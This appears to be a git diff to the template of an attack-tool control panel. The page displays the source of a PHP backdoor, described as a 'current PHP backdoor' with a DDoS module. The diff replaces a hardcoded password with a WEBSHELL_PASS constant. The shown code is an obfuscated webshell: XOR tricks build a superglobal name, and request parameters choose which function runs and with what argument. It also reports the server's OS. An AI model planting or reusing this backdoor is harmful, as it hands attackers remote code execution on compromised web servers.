@@ -60,7 +60,7 @@ quotes();
 date_default_timezone_set('Europe/London');
 if($_GET['_']) {
 print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
-print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
+print "{:|".md5("<?php echo WEBSHELL_PASS; ?>".date("h:d"))."{:|".PHP_OS."{:|-->";
 } elseif($_GET['___']) { @$_GET['___'](); }
 				</textarea>
 
@@ -74,7 +74,6 @@ print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
                             Current PHP backdoor with source code, ddos module included (not necessary)
                             </p>
 				<textarea style="border: none" rows="15" cols="80">
-					<?php echo WEBSHELL_PASS; ?>
 date_default_timezone_set('Europe/London');
 if($_GET['_']) {
 print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
